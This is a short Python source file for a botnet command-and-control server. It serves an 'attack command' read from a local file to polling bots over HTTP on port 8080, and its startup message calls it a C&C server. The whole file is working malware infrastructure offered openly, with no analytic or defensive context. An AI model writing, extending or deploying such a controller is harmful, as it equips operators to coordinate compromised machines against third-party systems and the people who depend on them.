import http.server
import socketserver

HOST = "0.0.0.0"
PORT = 8080

class NetBotRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        """Handles GET requests from bots."""
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(config().encode())

def config():
    """Reads the attack command from a file."""
    try:
        with open("command.txt", "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return "HALT"

def start_server():
    """Starts the HTTP C&C server."""
    with socketserver.ThreadingTCPServer((HOST, PORT), NetBotRequestHandler) as httpd:
        print(f"[*] C&C Server running on port {PORT}")
        httpd.serve_forever()

if __name__ == "__main__":
    start_server()
